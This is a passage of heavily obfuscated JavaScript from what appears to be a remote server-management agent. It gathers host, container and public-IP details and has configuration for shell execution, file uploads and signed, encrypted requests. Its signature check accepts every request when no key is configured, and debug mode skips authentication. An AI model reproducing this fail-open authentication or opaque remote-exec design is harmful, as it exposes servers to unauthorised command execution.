        'z2v0q29UDgfPBMvYtwvTB3j5',
        'zurSDgK',
        'y2LWAgvY',
        'x2fWCgvUzeXVzW',
        'rMLSzsbUB3qGzM91BMq',
        'DgvZDa',
        'se9tva',
        'lcbtAwDUywW6ia',
        'y2XLyxjdCM9Utg9NCW',
        'l2jPBI9IyxnO',
        'rg9JA2vY',
        'zgLZAW',
        'AxnwywXPzeLqDJq',
        'EuXZuwm',
        'ufPmtMS',
        'Chv0',
        'Chr5uhjVy2vZCW',
        'l3j1BI8Uy29UDgfPBMvYzw52',
        'uuvnvq',
        'C2v0',
        'C3rYAw5N',
        'y2jerhO',
        'BgvUz3rO',
        'g1SZnM1Bsu5gt10BwZbTia',
        'wf9psW',
        'l2rLDI8',
        'ywDLBNq',
        'q3LWs2C',
        'y3jVBKPVyNm',
        'BMv0D29YAW',
        'zMLSzxm',
        'CM93CW',
        'veLnrvnuqu1qx1DjtKrpvW',
        'ywXS',
        'vw5JyxvNAhqGrxHJzxb0Aw9UoG',
        'BM90x2zVDw5K',
        'B2jQzwn0',
        'r3zVA1y',
        'y2H1BMTFAwq',
        'C2nOzwr1Bgu',
        '8j+KNsdLVidLP4SGtM9PC2uG5yQG5A+g5O+H5OMllI4U',
        'B25LDgfZA3m',
        'mZaW',
        'zg9JA2vY',
        'ALbJtu8',
        'revcvuC',
        'C2vZC2LVBL9RzxK',
        'y3DK',
        'wxvmCMC',
        'tuvMt3i',
        'u3rHCNrPBMCGBwfPBIGPigz1BMn0Aw9UlI4U',
        'mc4WlJaUma'
    ];
    a0a = function () {
        return c1;
    };
    return a0a();
}
class a0w extends a0u {
    constructor() {
        const Z = a0S;
        super(), this[Z(0x155)] = '', this['cpu_cores'] = 0x0, this[Z(0x309)] = '', this[Z(0x3e0)] = 0x0, this['gpu_name'] = '', this[Z(0x16e)] = null, this[Z(0x300)] = null, this[Z(0x2d3)] = 0x0, this['os'] = '', this['kernel_version'] = '', this[Z(0x28e)] = 0x0, this['version'] = a0D[Z(0x2d8)], this[Z(0x23f)] = '', this[Z(0x3d2)] = '', this['noise_key'] = null;
    }
}
class a0x extends a0u {
    constructor() {
        const a0 = a0S, a = { 'yjWvO': a0(0x3a2) }, b = a[a0(0x1b3)][a0(0x166)]('|');
        let c = 0x0;
        while (!![]) {
            switch (b[c++]) {
            case '0':
                this[a0(0x2b2)] = { 'usage': 0x0 };
                continue;
            case '1':
                this[a0(0x2e5)] = 0x0;
                continue;
            case '2':
                super();
                continue;
            case '3':
                this[a0(0x3af)] = {
                    'total': 0x0,
                    'used': 0x0
                };
                continue;
            case '4':
                this['connections'] = {
                    'tcp': 0x0,
                    'udp': 0x0
                };
                continue;
            case '5':
                this['load'] = {
                    'load1': 0x0,
                    'load5': 0x0,
                    'load15': 0x0
                };
                continue;
            case '6':
                this['uptime'] = 0x0;
                continue;
            case '7':
                this[a0(0x3c1)] = {
                    'up': 0x0,
                    'down': 0x0,
                    'totalUp': 0x0,
                    'totalDown': 0x0
                };
                continue;
            case '8':
                this[a0(0x35a)] = '';
                continue;
            case '9':
                this['ram'] = {
                    'total': 0x0,
                    'used': 0x0
                };
                continue;
            case '10':
                this['swap'] = {
                    'total': 0x0,
                    'used': 0x0
                };
                continue;
            }
            break;
        }
    }
}
class a0y extends a0u {
    constructor() {
        const a1 = a0S, a = { 'lspWQ': '1|2|0|3|4' }, b = a[a1(0x311)]['split']('|');
        let c = 0x0;
        while (!![]) {
            switch (b[c++]) {
            case '0':
                this['exitcode'] = 0x0;
                continue;
            case '1':
                super();
                continue;
            case '2':
                this[a1(0x3e8)] = '';
                continue;
            case '3':
                this[a1(0x364)] = ![];
                continue;
            case '4':
                this[a1(0x299)] = '';
                continue;
            }
            break;
        }
    }
}
class a0z {
    constructor() {
        const a2 = a0S, a = { 'vVmDi': a2(0x2d2) }, b = a[a2(0x436)][a2(0x166)]('|');
        let c = 0x0;
        while (!![]) {
            switch (b[c++]) {
            case '0':
                this[a2(0x1c2)] = '';
                continue;
            case '1':
                this[a2(0x329)] = 0x0;
                continue;
            case '2':
                this[a2(0x267)] = '';
                continue;
            case '3':
                this['mode_octal'] = '';
                continue;
            case '4':
                this['name'] = '';
                continue;
            case '5':
                this[a2(0x236)] = '';
                continue;
            case '6':
                this[a2(0x2c1)] = '';
                continue;
            case '7':
                this[a2(0x259)] = '';
                continue;
            }
            break;
        }
    }
}
class a0A {
    constructor() {
        const a3 = a0S, a = { 'RIFXG': '0|3|5|7|6|2|1|4' }, b = a[a3(0x2dd)][a3(0x166)]('|');
        let c = 0x0;
        while (!![]) {
            switch (b[c++]) {
            case '0':
                this[a3(0x1c2)] = '';
                continue;
            case '1':
                this[a3(0x34b)] = ![];
                continue;
            case '2':
                this['readable'] = ![];
                continue;
            case '3':
                this[a3(0x2a9)] = '';
                continue;
            case '4':
                this[a3(0x34a)] = ![];
                continue;
            case '5':
                this[a3(0x236)] = '';
                continue;
            case '6':
                this['type'] = '';
                continue;
            case '7':
                this['mode_octal'] = '';
                continue;
            }
            break;
        }
    }
}
class a0B extends a0u {
    constructor() {
        const a4 = a0S;
        super(), this[a4(0x3c2)] = [];
    }
}
class a0C {
    static [a0S(0x1cb)]() {
        const a5 = a0S, a = {
                'AzkTu': 'x25519',
                'hiUCd': a5(0x2ca),
                'TnOsn': a5(0x1da),
                'izIbK': function (i, j) {
                    return i !== j;
                },
                'IVUkU': a5(0x209)
            }, {
                privateKey: b,
                publicKey: c
            } = a0g[a5(0x3a0)](a[a5(0x20a)]), d = b['export']({ 'format': a['hiUCd'] }), f = c[a5(0x14d)]({ 'format': a[a5(0x42d)] }), g = Buffer[a5(0x1ec)](d['d'], a[a5(0x264)]), h = Buffer[a5(0x1ec)](f['x'], 'base64url');
        return (a[a5(0x2b8)](g[a5(0x3ba)], 0x20) || a[a5(0x2b8)](h['length'], 0x20)) && a0t[a5(0x338)](a5(0x40e)), {
            'private_b64': g[a5(0x3f4)](a[a5(0x2c3)]),
            'public_b64': h[a5(0x3f4)](a['IVUkU'])
        };
    }
    static [a0S(0x40a)](a) {
        const a6 = a0S, b = this[a6(0x1cb)]();
        return {
            'role': a,
            'private_b64': b[a6(0x2ac)],
            'public_b64': b[a6(0x393)]
        };
    }
    static [a0S(0x31b)](a = a0S(0x23b), b = 'Agent') {
        const a7 = a0S, c = {
                'control': this[a7(0x40a)](a),
                'agent': this['generateSingle'](b)
            };
        return c;
    }
}
class a0D {
    static [a0S(0x167)] = parseInt(process.env.EXEC_TIMEOUT || '30');
    static [a0S(0x228)] = (process.env.EXEC_SHELL || a0S(0x2b9))[a0S(0x344)]() === a0S(0x2b9);
    static [a0S(0x3d1)] = (process.env.DEBUG || a0S(0x250))[a0S(0x344)]() === a0S(0x2b9);
    static [a0S(0x3c4)] = parseInt(process.env.TIMESTAMP_WINDOW || a0S(0x23e));
    static ['LOG_LEVEL'] = parseInt(process.env.LOG_LEVEL || (this['DEBUG'] ? '0' : '2'), 0xa);
    static [a0S(0x177)] = a0D[a0S(0x2b7)](a0S(0x2af), 'keys/agent_ecdsa_pub.pem') || 'ECDSA公钥内容';
    static [a0S(0x380)] = a0D[a0S(0x2b7)](a0S(0x375), 'keys/agent_ecies_pub.b64') || 'ECIES公钥内容';
    static [a0S(0x32e)] = process.env.FILE_ROOT || a0k[a0S(0x148)]();
    static ['MAX_UPLOAD_SIZE'] = parseInt(process.env.MAX_UPLOAD_SIZE || '104857600');
    static ['FOLLOW_SYMLINKS'] = (process.env.FOLLOW_SYMLINKS || a0S(0x250))[a0S(0x344)]() === a0S(0x2b9);
    static [a0S(0x234)] = (process.env.FILE_AUDIT_LOG || 'true')['toLowerCase']() === 'true';
    static [a0S(0x1c6)] = !![];
    static [a0S(0x3cd)] = [];
    static [a0S(0x2bb)] = {};
    static [a0S(0x1b8)] = ![];
    static [a0S(0x39d)] = parseInt(process.env.TASK_TIMEOUT || a0S(0x3ce));
    static [a0S(0x18b)] = parseInt(process.env.CRON_INTERVAL || '30');
    static [a0S(0x23c)] = [];
    static [a0S(0x22c)] = [];
    static ['MAX_TASK_LOG_SIZE'] = parseInt(process.env.MAX_TASK_LOG || a0S(0x16d));
    static [a0S(0x3aa)] = process.env.HOST || a0S(0x3d7);
    static [a0S(0x385)] = parseInt(process.env.PORT || process.env.SERVER_PORT || a0S(0x29d));
    static [a0S(0x2d8)] = process.env.AGENT_VERSION || '0.1.7-js';
    static [a0S(0x1dd)] = a0g[a0S(0x1a0)](0x20)['toString'](a0S(0x209));
    static [a0S(0x31d)] = a0C[a0S(0x31b)]();
    static [a0S(0x357)] = {
        'controller': { 'private': this[a0S(0x31d)][a0S(0x15c)][a0S(0x2ac)] },
        'agent': { 'public': this[a0S(0x31d)][a0S(0x3be)][a0S(0x393)] }
    };
    static [a0S(0x2b7)](a, b) {
        const a8 = a0S, c = { 'wPQsE': a8(0x18f) }, d = process.env[a];
        if (d)
            return d;
        const f = a0j[a8(0x30a)](__dirname, b);
        if (a0h['existsSync'](f))
            try {
                return a0h['readFileSync'](f, c['wPQsE'])[a8(0x273)]();
            } catch (g) {
            }
        return '';
    }
    static [a0S(0x2fa)]() {
        const a9 = a0S, a = {
                'ChZAJ': 'ECDSA_PUBKEY:\x20未设置环境变量且文件\x20keys/agent_ecdsa_pub.pem\x20不存在',
                'HXGri': a9(0x270),
                'VpSAS': a9(0x243),
                'qEULq': a9(0x414)
            };
        if (!this[a9(0x3d1)]) {
            const b = [];
            !this[a9(0x177)] && b[a9(0x2d0)](a[a9(0x1b1)]), !this['ECIES_PUBLIC_KEY_PEM'] && b[a9(0x2d0)](a[a9(0x33a)]), b['length'] > 0x0 && (a0t[a9(0x338)](a9(0x249)), b[a9(0x153)](c => a0t[a9(0x338)](a9(0x369) + c)), a0t['debug'](a[a9(0x1a1)]), a0t[a9(0x2fc)](a['qEULq']), a0t[a9(0x2fc)]('\x20\x20\x202.\x20或将密钥文件放入\x20./keys/\x20目录\x20(运行\x20generate_keys.py\x20生成)'), process[a9(0x3fa)](0x1));
        }
    }
}
class a0E {
    constructor(a, b) {
        const aa = a0S;
        this[aa(0x173)] = null, this[aa(0x2da)] = null;
        a && (this[aa(0x173)] = a0g['createPublicKey'](a));
        if (b)
            try {
                this[aa(0x2da)] = a0p[aa(0x2a1)](b[aa(0x273)]());
            } catch (c) {
                a0t[aa(0x26c)](aa(0x3e6) + c[aa(0x35a)]);
            }
    }
    ['verifySignature'](a, b, c) {
        const ab = a0S, d = {
                'oQMpb': function (f, g) {
                    return f(g);
                },
                'pXrsb': function (f, g) {
                    return f - g;
                },
                'aOXBR': ab(0x31f)
            };
        if (!this[ab(0x173)])
            return !![];
        try {
            const f = d[ab(0x174)](parseInt, b), g = Math[ab(0x361)](Date[ab(0x262)]() / 0x3e8);
            if (Math['abs'](g - f) > a0D[ab(0x3c4)])
                throw new Error(ab(0x161) + Math[ab(0x336)](d[ab(0x2a3)](g, f)) + ab(0x1dc) + a0D[ab(0x3c4)] + 's');
            const h = '' + a + b, i = a0p[ab(0x2a1)](c), j = a0g[ab(0x23a)](d[ab(0x241)]);
            return j[ab(0x224)](h), j[ab(0x27f)](this['ecdsaPubkey'], i);
        } catch (k) {
            throw new Error('Signature\x20verification\x20failed:\x20' + k[ab(0x35a)]);
        }
    }
    [a0S(0x162)](a) {
        const ac = a0S, b = {
                'PKdGZ': ac(0x313),
                'BdcQB': function (c, d, f) {
                    return c(d, f);
                },
                'tHdTG': ac(0x209)
            };
        if (a0D[ac(0x3d1)] || !this[ac(0x2da)])
            return JSON[ac(0x2b4)](a);
        try {
            const c = JSON[ac(0x2b4)](a), d = Buffer[ac(0x1ec)](c, b[ac(0x201)]), f = Buffer[ac(0x1ec)](this['eciesPubkey']), g = b['BdcQB'](a0o, f, d);
            return Buffer['from'](g)[ac(0x3f4)](b['tHdTG']);
        } catch (h) {
            const i = {
                '_encrypt_error': h['message'],
                '_raw': a0D[ac(0x3d1)] ? a : null
            };
            return JSON['stringify'](i);
        }
    }
    [a0S(0x2db)](a, b) {
        const ad = a0S, c = {
                'hUQXn': 'AES\x20Decrypt\x20Error:\x20Key\x20must\x20be\x20exactly\x2032\x20bytes\x20for\x20AES-256.',
                'NfOvI': ad(0x209),
                'ELHLF': 'utf8',
                'gbDvv': 'Missing\x20required\x20AES-GCM\x20fields\x20(nonce,\x20tag,\x20ciphertext)\x20in\x20payload.',
                'TrGdw': ad(0x1b5)
            };
        if (!b || b['length'] !== 0x20)
            throw new Error(c['hUQXn']);
        try {
            const d = Buffer[ad(0x1ec)](a, c[ad(0x2f8)])['toString'](c[ad(0x359)]), f = JSON['parse'](d);
            if (!f['nonce'] || !f[ad(0x170)] || !f[ad(0x374)])
                throw new Error(c[ad(0x390)]);
            const g = Buffer[ad(0x1ec)](f['nonce'], ad(0x209)), h = Buffer[ad(0x1ec)](f[ad(0x170)], 'base64'), i = Buffer['from'](f[ad(0x374)], c[ad(0x2f8)]), j = a0g[ad(0x2c5)](c['TrGdw'], b, g);
            j[ad(0x302)](h);
            let k = j[ad(0x224)](i, null, ad(0x18f));
            return k += j[ad(0x193)](ad(0x18f)), k;
        } catch (l) {
            throw new Error(ad(0x3dc) + l[ad(0x35a)]);
        }
    }
}
function a0F(a) {
    const ae = a0S, b = {
            'jyeHL': ae(0x1f6),
            'lEsrA': ae(0x431),
            'SMvvi': function (c, d) {
                return c === d;
            },
            'qHYrD': ae(0x3b8),
            'yLsQc': 'x-encrypted',
            'nzpmU': 'true',
            'pNsZI': ae(0x307),
            'oOWpI': ae(0x15a),
            'ZNBCB': 'false',
            'cbDDz': ae(0x18f),
            'BxTTz': function (c) {
                return c();
            },
            'cKBdk': function (c, d) {
                return c === d;
            },
            'qEIHp': ae(0x1e3),
            'GRqbR': ae(0x434),
            'pfNXV': function (c) {
                return c();
            },
            'PFueI': ae(0x3f9),
            'YTajp': ae(0x16a),
            'aenZa': ae(0x389),
            'RJNTv': ae(0x322),
            'zgBLt': ae(0x3f7),
            'jXvgg': ae(0x1ce),
            'ePJSl': ae(0x3e4),
            'EFugV': function (c, d) {
                return c || d;
            },
            'KycUX': ae(0x340),
            'FQMSN': 'x-aes-encrypted',
            'jPyfp': 'base64',
            'VEeiW': ae(0x244)
        };
    return async (c, d, f) => {
        const af = ae, g = {
                'mQuFG': b[af(0x220)],
                'gRgWf': b[af(0x239)],
                'KVSAM': function (j, k) {
                    const ag = af;
                    return b[ag(0x31e)](j, k);
                },
                'JvtZS': function (j, k) {
                    const ah = af;
                    return b[ah(0x31e)](j, k);
                },
                'gtlso': b[af(0x175)],
                'JKDba': b[af(0x3b1)],
                'dfiyj': b[af(0x1de)],
                'CTEyY': b[af(0x218)],
                'hBmuu': b[af(0x20f)],
                'oDZHe': b['ZNBCB'],
                'aCdnS': b[af(0x3b9)]
            };
        if (c[af(0x1c2)][af(0x1f5)](af(0x2cc)) || (c[af(0x312)][af(0x2e1)] || '')[af(0x344)]() === 'websocket')
            return b[af(0x151)](f);
        if (b[af(0x1c0)](c[af(0x263)], b[af(0x26f)]) || b['cKBdk'](c['method'], b[af(0x331)]))
            return b['pfNXV'](f);
        c[af(0x370)] = !![];
        const h = [
            b[af(0x433)],
            af(0x399)
        ];
        if (!a0D[af(0x3d1)] && !c[af(0x312)][b[af(0x19c)]]) {
            const j = c[af(0x312)][b[af(0x37b)]] || c[af(0x312)][af(0x28c)], k = c[af(0x312)][b[af(0x225)]] || c['headers'][b[af(0x216)]], l = c[af(0x312)][b[af(0x418)]] || c[af(0x312)][b[af(0x330)]];
            if (b['EFugV'](!j, !k) || !l) {
                if (h[af(0x182)](c[af(0x1c2)]))
                    c['is_authenticated'] = ![];
                else
                    return d['status'](0x191)['json']({ 'error': b[af(0x3ec)] });
            }
            if (c[af(0x370)])
                try {
                    a['verifySignature'](j, k, l);
                } catch (m) {
                    if (h[af(0x182)](c[af(0x1c2)]))
                        c[af(0x370)] = ![];
                    else
                        return d[af(0x160)](0x191)['json']({ 'error': af(0x438) + m[af(0x35a)] });
                }
        }
        if (c[af(0x20e)] && typeof c[af(0x20e)] === b['qHYrD']) {
            const n = b['cKBdk']((c[af(0x312)][b[af(0x26d)]] || '')[af(0x344)](), b['nzpmU']);
            try {
                if (n && c[af(0x370)]) {
                    const o = Buffer[af(0x1ec)](a0D[af(0x1dd)], b['jPyfp']), p = a[af(0x2db)](c[af(0x20e)], o);
                    c[af(0x20e)] = JSON[af(0x430)](p);
                } else {
                    if (c[af(0x20e)][af(0x1f5)](b['VEeiW'])) {
                        const q = Buffer[af(0x1ec)](c['body'], af(0x209))['toString'](af(0x313));
                        c[af(0x20e)] = JSON[af(0x430)](q);
                    } else {
                        if (c[af(0x20e)][af(0x273)]()[af(0x1f5)]('{') || c['body'][af(0x273)]()[af(0x1f5)]('['))
                            c[af(0x20e)] = JSON[af(0x430)](c[af(0x20e)]);
                        else {
                            if (c[af(0x20e)][af(0x273)]() === '')
                                c['body'] = {};
                        }
                    }
                }
            } catch (r) {
                return a0t[af(0x338)]('💥\x20[Body\x20Parse\x20Error]:\x20' + r['message']), d[af(0x160)](0x190)['json']({ 'error': af(0x40d) + r[af(0x35a)] });
            }
        }
        const i = d['send'];
        d[af(0x429)] = function (s) {
            const ai = af;
            if (d['get'](g['mQuFG']) && d[ai(0x269)](g['mQuFG'])['includes'](g[ai(0x3e9)]))
                try {
                    const t = g['KVSAM'](typeof s, ai(0x3b8)) ? JSON[ai(0x430)](s) : s;
                    if (c[ai(0x370)]) {
                        const u = a[ai(0x162)](t), v = g[ai(0x212)](typeof u, g[ai(0x29b)]) ? u : JSON[ai(0x2b4)](u);
                        return !a0D['DEBUG'] && (d[ai(0x3b7)](g[ai(0x1f9)], g[ai(0x1b0)]), d[ai(0x3b7)](g[ai(0x421)], a0D[ai(0x2d8)])), d[ai(0x3b7)](g[ai(0x2e2)], Buffer[ai(0x156)](v, 'utf8')[ai(0x3f4)]()), i[ai(0x1ae)](this, v);
                    } else {
                        const w = typeof s === ai(0x3b8) ? s : JSON[ai(0x2b4)](t);
                        return d[ai(0x3b7)](g[ai(0x1f9)], g[ai(0x308)]), d[ai(0x3b7)](g[ai(0x2e2)], Buffer[ai(0x156)](w, g['aCdnS'])[ai(0x3f4)]()), i[ai(0x1ae)](this, w);
                    }
                } catch (x) {
                    if (a0D[ai(0x3d1)])
                        a0t[ai(0x338)](ai(0x29e) + x['message']);
                }
            return i['call'](this, s);
        }, b[af(0x151)](f);
    };
}
class a0G {
    constructor() {
        const aj = a0S, a = {
                'iIokJ': function (b, c) {
                    return b / c;
                }
            };
        this['lastNetworkStats'] = {
            'rx': 0x0,
            'tx': 0x0
        }, this[aj(0x227)] = 0x0, this['totalNetworkDown'] = 0x0, this['lastNetworkTime'] = a[aj(0x35d)](Date['now'](), 0x3e8);
    }
    async [a0S(0x3a4)]() {
        const ak = a0S, a = {
                'lKfHn': ak(0x1db),
                'igcrT': 'utf8',
                'hFucG': function (d, f) {
                    return d === f;
                },
                'KkDrI': ak(0x253),
                'aHQUJ': function (d, f, g) {
                    return d(f, g);
                },
                'NVDor': ak(0x19e),
                'tfqGD': function (d, f) {
                    return d(f);
                },
                'rgphi': function (d, f) {
                    return d - f;
                },
                'jknDL': function (d, f) {
                    return d - f;
                }
            };
        let b = null, c = null;
        try {
            const d = (await a0i['readFile'](a[ak(0x25e)], a[ak(0x1ff)]))[ak(0x273)]();
            b = a[ak(0x16f)](d, a[ak(0x2f2)]) ? null : a['aHQUJ'](parseInt, d, 0xa), c = parseInt((await a0i[ak(0x1ee)]('/sys/fs/cgroup/memory.current', a['igcrT']))[ak(0x273)](), 0xa);
        } catch {
            try {
                b = a[ak(0x325)](parseInt, (await a0i[ak(0x1ee)](ak(0x35e), ak(0x18f)))['trim'](), 0xa), c = a[ak(0x325)](parseInt, (await a0i[ak(0x1ee)](a['NVDor'], a[ak(0x1ff)]))[ak(0x273)](), 0xa);
                if (b > 0x7ffffffffffff000)
                    b = null;
            } catch {
                const f = await a0n['mem']();
                b = f[ak(0x3d9)], c = f[ak(0x277)];
            }
        }
        if (a[ak(0x16f)](b, null)) {
            const g = await a0n[ak(0x408)]();
            b = g[ak(0x3d9)], (a['hFucG'](c, null) || a[ak(0x18d)](isNaN, c)) && (c = g[ak(0x277)]);
        }
        return {
            'total': b,
            'used': c,
            'available': a['rgphi'](b, c),
            'free': a[ak(0x28a)](b, c),
            'cached': 0x0,
            'buffers': 0x0
        };
    }
    async [a0S(0x3ef)]() {
        const al = a0S, [a, b, c, d] = await Promise[al(0x3c5)]([
                a0n[al(0x2b2)](),
                this['getContainerMemory'](),
                a0n[al(0x24c)](),
                a0n[al(0x40f)]()
            ]);
        let f = null, g = null;
        try {
            [f, g] = await Promise['all']([
                this[al(0x1a2)](),
                this[al(0x437)]()
            ]);
        } catch (h) {
            a0t[al(0x2fc)]('获取\x20IP\x20地址失败:\x20' + h[al(0x35a)], 0x1);
        }
        return {
            'arch': a0k[al(0x155)](),
            'cpu_cores': a[al(0x1a9)],
            'cpu_name': a[al(0x3dd)],
            'disk_total': (await a0n[al(0x21b)]())[0x0]?.[al(0x329)] || 0x0,
            'gpu_name': '',
            'ipv4': f,
            'ipv6': g,
            'mem_total': b[al(0x3d9)],
            'os': c[al(0x3ea)] + '\x20' + c[al(0x24e)],
            'kernel_version': c['kernel'],
            'swap_total': b[al(0x3ee)],
            'version': a0D['AGENT_VERSION'],
            'virtualization': await this['_getVirtualization'](),
            'session_key': a0D[al(0x1dd)],
            'noise_key': a0D[al(0x357)]
        };
    }
    [a0S(0x304)]() {
        const am = a0S, a = {
                'gRmJK': function (c, d) {
                    return c === d;
                }
            }, b = a0k[am(0x40f)]();
        for (const c of Object[am(0x1aa)](b)) {
            for (const d of b[c]) {
                const f = a[am(0x43c)](d['family'], am(0x1d9)) || a['gRmJK'](d['family'], 0x4);
                if (f && !d[am(0x25d)]) {
                    if (!/^10\./['test'](d['address']) && !/^192\.168\./[am(0x3a9)](d[am(0x2c8)]) && !/^172\.(1[6-9]|2[0-9]|3[0-1])\./[am(0x3a9)](d[am(0x2c8)]))
                        return d[am(0x2c8)];
                }
            }
        }
        return null;
    }
    async [a0S(0x1a2)]() {
        const an = a0S, a = {
                'aSWom': an(0x298),
                'HrEXZ': 'https://ipinfo.io/ip',
                'daXRJ': 'https://myexternalip.com/raw'
            }, b = [
                a[an(0x194)],
                'https://icanhazip.com',
                an(0x288),
                an(0x235),
                an(0x232),
                a[an(0x2f5)],
                a['daXRJ']
            ];
        for (const d of b) {
            try {
                const f = await this[an(0x419)](d, 0x4);
                if (f && this['isValidIPv4'](f))
                    return f;
            } catch (g) {
                continue;
            }
        }
        const c = this[an(0x304)]();
        if (c && this['isValidIPv4'](c))
            return c;
        return null;
    }
    [a0S(0x27e)]() {
        const ao = a0S, a = {
                'JyJrO': function (c, d) {
                    return c === d;
                },
                'rOSEx': ao(0x3eb)
            }, b = a0k[ao(0x40f)]();
        for (const c of Object[ao(0x1aa)](b)) {
            for (const d of b[c]) {
                const f = d['family'] === ao(0x2f6) || a[ao(0x221)](d['family'], 0x6);
                if (f && !d[ao(0x25d)]) {
                    if (!d[ao(0x2c8)][ao(0x344)]()[ao(0x1f5)](a[ao(0x1e8)]))
                        return d[ao(0x2c8)];
                }
            }
        }
        return null;
    }
    async [a0S(0x437)]() {
        const ap = a0S, a = { 'rFqxI': ap(0x360) }, b = this[ap(0x27e)]();
        if (b && this['isValidIPv6'](b))
            return b;
        const c = [
            'https://api6.ipify.org',
            a[ap(0x204)],
            ap(0x1f3)
        ];
        for (const d of c) {
            try {
                const f = await this[ap(0x419)](d, 0x6);
                if (f && this[ap(0x25f)](f))
                    return f;
            } catch (g) {
                a0t[ap(0x2fc)](ap(0x275) + d + '\x20失败:\x20' + g['message']);
                continue;
            }
        }
        return null;
    }
    async [a0S(0x419)](a, b = 0x0) {
        const aq = a0S, c = {
                'mbqbH': function (d, f) {
                    return d !== f;
                },
                'TgEmc': function (d, f) {
                    return d(f);
                },
                'bRjdR': aq(0x1d5),
                'TtUOb': aq(0x294),
                'zNhRl': function (d, f) {
                    return d(f);
                },
                'EzrJp': aq(0x18e),
                'RKrNX': aq(0x2b3),
                'yQSRJ': 'error'
            };
        return new Promise((d, f) => {
            const ar = aq, g = require(ar(0x1f1)), h = {
                    'timeout': 0x1388,
                    'family': b,
                    'headers': { 'Accept': c[ar(0x2cd)] }
                }, i = g[ar(0x269)](a, h, j => {
                    const as = ar;
                    let k = '';
                    if (c[as(0x22e)](j['statusCode'], 0xc8)) {
                        c[as(0x223)](f, new Error(as(0x432) + j['statusCode']));
                        return;
                    }
                    j['on'](c['bRjdR'], l => k += l), j['on'](c[as(0x337)], () => d(k['trim']()));
                });
            i['on'](c[ar(0x19f)], f), i['setTimeout'](0x1388, () => {
                const at = ar;
                i[at(0x363)](), c['zNhRl'](f, new Error(c[at(0x206)]));
            });
        });
    }
    [a0S(0x3b0)](a) {
        const au = a0S;
        return /^(\d{1,3}\.){3}\d{1,3}$/[au(0x3a9)](a);
    }
    [a0S(0x25f)](a) {
        const av = a0S;
        if (!/^[0-9a-fA-F:]+$/['test'](a) || !a['includes'](':'))
            return ![];
        if (/^(fe[89ab]|f[cd]|::1$|::$)/i[av(0x3a9)](a))
            return ![];
        return !![];
    }
    async [a0S(0x287)]() {
        const aw = a0S, a = {
                'CypKg': function (m, n) {
                    return m - n;
                },
                'fwrRh': function (m, n) {
                    return m / n;
                },
                'wWzoI': function (m, n) {
                    return m * n;
                },
                'LsuWN': function (m, n) {
                    return m * n;
                },
                'TZiZd': function (m, n) {
                    return m / n;
                }
            }, [b, c, d, f] = await Promise[aw(0x3c5)]([
                a0n['currentLoad'](),
                a0n[aw(0x408)](),
                a0n['networkStats'](),
                a0n[aw(0x147)]()
            ]), g = d[0x0] || {
                'tx_bytes': 0x0,
                'rx_bytes': 0x0
            }, h = Date[aw(0x262)]() / 0x3e8, i = h - this['lastNetworkTime'], j = a[aw(0x3bf)](g['tx_bytes'], this[aw(0x2ff)]['tx']), k = a[aw(0x3bf)](g[aw(0x36c)], this[aw(0x2ff)]['rx']);
        this['totalNetworkUp'] += j, this[aw(0x316)] += k, this[aw(0x2ff)] = {
            'tx': g[aw(0x29c)],
            'rx': g['rx_bytes']
        }, this[aw(0x1bc)] = h;
        const l = await a0n[aw(0x39a)]();
        return {
            'cpu': { 'usage': Math['round'](b[aw(0x147)]) },
            'ram': {
                'total': c[aw(0x3d9)],
                'used': c[aw(0x168)]
            },
            'swap': {
                'total': c[aw(0x3ee)],
                'used': c[aw(0x342)]
            },
            'load': {
                'load1': a[aw(0x22a)](Math[aw(0x295)](a[aw(0x27d)](f['avgLoad'], 0x64)), 0x64),
                'load5': a[aw(0x22a)](Math['round'](a['LsuWN'](f[aw(0x392)], 0x64)), 0x64),
                'load15': a[aw(0x18c)](Math[aw(0x295)](a['LsuWN'](f[aw(0x392)], 0x64)), 0x64)
            },
            'disk': await this[aw(0x266)](),
            'network': {
                'up': Math[aw(0x295)](j / i),
                'down': Math[aw(0x295)](a[aw(0x18c)](k, i)),
                'totalUp': this[aw(0x227)],
                'totalDown': this[aw(0x316)]
            },
            'connections': await this[aw(0x39e)](),
            'uptime': a0k['uptime'](),
            'process': l?.[aw(0x3c5)] || 0x0,
            'message': ''
        };
    }
    async ['_getVirtualization']() {
        const ax = a0S, a = {
                'HBoKT': '/.dockerenv',
                'gbJdg': ax(0x3ae),
                'Earrq': ax(0x315),
                'UElUX': ax(0x240),
                'xKcak': ax(0x18f),
                'gRKqj': ax(0x3cf),
                'mJtlA': ax(0x2fe),
                'hekdw': ax(0x2ab),
                'xArnp': ax(0x213),
                'xIFIR': ax(0x24b),
                'PTkGu': ax(0x2ed),
                'uQMDA': '/proc/self/mountinfo',
                'YVgZT': '/docker/containers/',
                'vtKQp': 'workdir=/var/lib/docker',
                'QruDR': ax(0x3fe),
                'nsPJh': '/proc/1/environ',
                'dQiaT': ax(0x36f),
                'PIbNT': '/proc/cpuinfo',
                'GIpcs': ax(0x3b6),
                'ARNCN': 'KVM',
                'gPgpC': 'None'
            };
        try {
            if (a0h[ax(0x1ed)](a[ax(0x403)]))
                return a['gbJdg'];
            if (a0h['existsSync'](ax(0x3b5)))
                return a[ax(0x207)];
            if (a0h['existsSync'](a['UElUX'])) {
                const b = a0h[ax(0x396)](a[ax(0x203)], a[ax(0x2df)])['toLowerCase']();
                if (b[ax(0x182)](a['gRKqj']) || b[ax(0x182)](a[ax(0x217)]))
                    return ax(0x3ae);
                else {
                    if (b[ax(0x182)](a['hekdw']))
                        return a[ax(0x25b)];
                    else {
                        if (b[ax(0x182)](a['xIFIR']))
                            return a[ax(0x310)];
                    }
                }
            }
            if (a0h[ax(0x1ed)](a['uQMDA'])) {
                const c = a0h[ax(0x396)](a['uQMDA'], a['xKcak']);
                if (c[ax(0x182)](a[ax(0x27b)]) || c[ax(0x182)](a[ax(0x247)]))
                    return a[ax(0x276)];
                else {
                    if (c[ax(0x182)](ax(0x343)) || c[ax(0x182)](a['QruDR']))
                        return a[ax(0x25b)];
                }
            }
            if (a0h[ax(0x1ed)](a[ax(0x33d)])) {
                const d = a0h[ax(0x396)]('/proc/1/environ', a[ax(0x2df)]);
                if (d[ax(0x182)](a[ax(0x28b)]))
                    return a['PTkGu'];
            }
            if (a0h[ax(0x1ed)](a[ax(0x290)])) {
                const f = a0h[ax(0x396)](ax(0x2bd), a[ax(0x2df)]);
                if (f['includes'](a[ax(0x394)]) || f[ax(0x182)](a[ax(0x27a)]))
                    return a[ax(0x394)];
            }
        } catch (g) {
        }
        return a[ax(0x1d0)];
    }
    async [a0S(0x266)]() {
        const ay = a0S, a = {
                'mIeTC': function (b, c) {
                    return b !== c;
                },
